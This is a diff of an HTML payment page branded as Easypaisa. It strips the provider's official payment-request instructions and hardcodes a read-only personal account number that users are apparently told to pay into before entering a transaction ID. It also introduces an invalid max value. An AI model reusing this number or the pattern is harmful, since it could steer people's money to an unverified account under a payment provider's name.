@@ -257,18 +257,9 @@
   <div class="box" id="step2">
     <p class="step-label">Step 2 of 3 — Payment</p>
 
-    <div class="ep-header-row">
-      <div class="ep-logo-wrap">
-        <span class="ep-logo">easypaisa</span>
-        <span class="ep-sub">Easypaisa Fast</span>
-      </div>
-      <div class="ep-video-btn">
-        <div class="ep-play">
-          <svg viewBox="0 0 10 10"><polygon points="2,1 9,5 2,9"/></svg>
-        </div>
-        How to make a deposit?
-      </div>
-    </div>
+   <div style="margin-bottom:16px;">
+  <span class="ep-logo">easypaisa</span>
+</div>
 
     <div class="ep-timer-bar">
       <span class="ep-timer-label">Payment</span>
@@ -289,13 +280,13 @@
       <ul class="ep-steps">
         <li>
           <span class="ep-step-num">1</span>
-          <span>Enter the amount and your phone number, and then click Pay</span>
+          <span>After paying please enter your TRX ID in right way</span>
         </li>
       </ul>
 
       <label>Amount</label>
       <div class="ep-amount-wrap">
-        <input type="number" id="confirm-amount" min="0" max="100000" placeholder="0 — 100,000 PKR" required>
+        <input type="number" id="confirm-amount" min="1" max="160,000" placeholder="1 — 160,000 PKR" required>
         <div class="ep-amount-icon">₨</div>
       </div>
 
@@ -307,26 +298,9 @@
       </ul>
 
       <label>Account Number</label>
-      <input type="tel" id="confirm-phone-ep" placeholder="03XX-XXXXXXX" required>
+      <input type="tel" id="confirm-phone-ep" value="03471881297" readonly>
 
-      <ul class="ep-steps" style="margin-top:14px;">
-        <li>
-          <span class="ep-warn-icon">⚠️</span>
-          <span>If you are Telenor user, just wait for the notification and enter your PIN to confirm the payment</span>
-        </li>
-        <li>
-          <span class="ep-step-num">3</span>
-          <span>Open the Easypaisa app and sign in, or wait for the notification to be sent and open the app through it</span>
-        </li>
-        <li>
-          <span class="ep-step-num">4</span>
-          <span>Go to "Payment Requests" and confirm the payment request</span>
-        </li>
-        <li>
-          <span class="ep-warn-icon">⚠️</span>
-          <span>Attention! After three failed attempts, you have to switch the account to make a deposit</span>
-        </li>
-      </ul>
+   
 
       <label>Transaction ID (TRX)</label>
       <input type="text" id="f-trx" placeholder="Paste TRX ID here" required>
